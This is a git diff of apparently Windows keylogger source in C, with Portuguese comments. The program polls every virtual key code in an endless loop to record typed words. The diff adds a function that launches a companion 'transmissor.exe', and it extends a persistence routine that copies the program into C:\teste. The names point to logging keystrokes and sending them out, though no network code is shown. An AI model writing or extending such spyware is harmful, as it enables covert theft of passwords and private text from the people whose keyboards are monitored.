@@ -6,11 +6,12 @@
 #include <stdbool.h>
 #include <ctype.h>
 
-// TODO daria para colocar essa variavel no arquivo config.cfg, pois conseguiria pegar esse caminho em outros arquivos 
-const char *BASE_FOLDER = "C:\\teste";  
+const char *BASE_FOLDER = "C:\\teste";
+
+#define MAX_PATH_LEN 260
 
 bool valPersis();
-void transmissorLog();
+void chamadaTransmissor();
 
 int main()
 {
@@ -20,6 +21,8 @@ int main()
 
     if (valPersis())
     {
+        chamadaTransmissor();
+
         while (1)
         {
             for (int vk = 0x08; vk <= 0xFE; vk++)
@@ -74,7 +77,6 @@ int main()
                             palavra[count++] = c;
                             palavra[count] = '\0';
                         }
-
                     }
                 }
             }
@@ -83,6 +85,23 @@ int main()
     }
 
     return 0;
+}
+
+void chamadaTransmissor()
+{
+    char exePath[MAX_PATH_LEN];
+
+    // Monta o caminho completo do transmissor.exe
+    snprintf(exePath, MAX_PATH_LEN, "%s\\transmissor.exe", BASE_FOLDER);
+
+    // Abre o transmissor.exe
+    ShellExecute(
+        NULL,
+        "open",
+        exePath, // aqui passamos a string já formatada
+        NULL,
+        NULL,
+        SW_SHOWNORMAL);
 }
 
 bool valPersis()
@@ -105,6 +124,9 @@ bool valPersis()
         CreateDirectory(BASE_FOLDER, NULL);
 
         snprintf(exePath, MAX_PATH, "%s\\main.exe", BASE_FOLDER);
+        CopyFile(currentPath, exePath, FALSE);
+
+        snprintf(exePath, MAX_PATH, "%s\\transmissor.exe", BASE_FOLDER);
         CopyFile(currentPath, exePath, FALSE);
 
         varsConf = fopen(configPath, "w");
@@ -139,4 +161,4 @@ bool valPersis()
     return false;
 }
 
-//gcc main.c -o main.exe -lole32 -luuid -lshell32; ./main.exe
+// gcc main.c -o main.exe -lole32 -luuid -lshell32; ./main.exe
